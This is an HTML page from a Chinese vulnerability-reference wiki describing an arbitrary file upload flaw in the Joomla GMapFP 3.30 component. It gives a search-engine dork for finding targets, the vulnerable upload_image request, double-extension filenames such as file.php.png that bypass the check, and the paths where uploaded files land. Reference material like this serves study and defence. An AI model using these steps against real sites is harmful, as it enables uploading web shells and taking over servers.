@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Joomla/Joomla%21%20component%20GMapFP%203.30%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Joomla component GMapFP 3.30 任意文件上传 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Joomla component GMapFP 3.30 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9ECVE-2023-23752/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9ECVE-2023-23752/" class="btn btn-xs btn-link">
+        Joomla 未授权漏洞CVE 2023 23752
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Joomla%21%20com_hdwplayer%204.2%20-%20%27search.php%27%20sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Joomla%21%20com_hdwplayer%204.2%20-%20%27search.php%27%20sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Joomla com_hdwplayer 4.2 - \'search.php\' sql注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="joomla-component-gmapfp-330">Joomla component GMapFP 3.30 任意文件上传<a class="headerlink" href="#joomla-component-gmapfp-330" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>关键字:inurl:\'\'com_gmapfp\'\'</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Joomla Gmapfp Components 3.x</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">option</span><span class="o">=</span><span class="n">comgmapfp</span><span class="o">&amp;</span><span class="n">controller</span><span class="o">=</span><span class="n">editlieux</span><span class="o">&amp;</span><span class="n">tmpl</span><span class="o">=</span><span class="n">component</span><span class="o">&amp;</span><span class="n">task</span><span class="o">=</span><span class="n">upload_image</span>
+<span class="n">file</span><span class="o">.</span><span class="n">php</span><span class="o">.</span><span class="n">png</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">file2</span><span class="o">.</span><span class="n">php</span><span class="o">.</span><span class="n">jpeg</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">file3</span><span class="o">.</span><span class="n">html</span><span class="o">.</span><span class="n">jpg</span><span class="w"> </span><span class="p">,</span><span class="n">file3</span><span class="o">.</span><span class="n">txt</span><span class="o">.</span><span class="n">jpg</span>
+</code></pre></div>
+
+<p>目录文件路径</p>
+<div class="codehilite"><pre><span></span><code>http://www.0-sec.org/images/gmapfp/file.php
+http://www.0-sec.org/images/gmapfp/file.php.png
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9ECVE-2023-23752/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9ECVE-2023-23752/" class="btn btn-xs btn-link">
+        Joomla 未授权漏洞CVE 2023 23752
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Joomla%21%20com_hdwplayer%204.2%20-%20%27search.php%27%20sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Joomla%21%20com_hdwplayer%204.2%20-%20%27search.php%27%20sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Joomla com_hdwplayer 4.2 - \'search.php\' sql注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
